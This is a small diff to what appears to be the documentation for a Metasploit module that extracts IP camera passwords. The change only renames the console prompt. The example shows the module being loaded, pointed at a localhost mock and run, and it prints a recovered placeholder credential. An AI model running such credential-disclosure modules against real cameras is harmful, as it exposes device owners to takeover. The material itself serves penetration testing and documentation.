@@ -51,10 +51,10 @@ if ($Q::query == "ADMINID") {
 ### Against the Mock page listed above
 
   ```
-  msf5 > use auxiliary/gather/ipcamera_password_disclosure 
-  msf5 auxiliary(gather/ipcamera_password_disclosure) > set rhosts 127.0.0.1
+  msf > use auxiliary/gather/ipcamera_password_disclosure 
+  msf auxiliary(gather/ipcamera_password_disclosure) > set rhosts 127.0.0.1
   rhosts => 127.0.0.1
-  msf5 auxiliary(gather/ipcamera_password_disclosure) > run
+  msf auxiliary(gather/ipcamera_password_disclosure) > run
   
   [+] Found: admin:password
   [*] Scanned 1 of 1 hosts (100% complete)
